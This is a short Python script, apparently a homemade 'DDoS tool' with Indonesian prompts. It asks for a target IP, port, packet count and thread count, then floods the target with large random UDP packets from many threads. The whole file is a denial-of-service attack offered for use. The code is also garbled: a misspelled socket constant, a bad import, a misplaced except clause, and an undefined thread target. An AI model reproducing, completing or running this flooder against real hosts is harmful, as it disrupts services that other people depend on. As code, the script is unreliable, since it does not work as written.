import socket
import random
import threading
import os.sys

print("DDOS TOOLS1 BY MOSTOAS")

ip_target = str(input("Ip Nya : "))
port_target = int(input("Port Nya : "))
paket_target = int(input("Paket Nya : "))
threads_target = int(input("Thread nya : "))
os.system("clear")

def target():
    target = random._urandom(66666)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_target,port_target))
            s.sendto(target)
            for x in range(paket_target):
                s.sendto(target)
                print("MEMBERI KOPI KE TARGET")
            except:
                print("MEMBERI KOPI KE TARGET")
                
for y in range(threads_target):
    th = threading.Thread(target_target)
    th.start()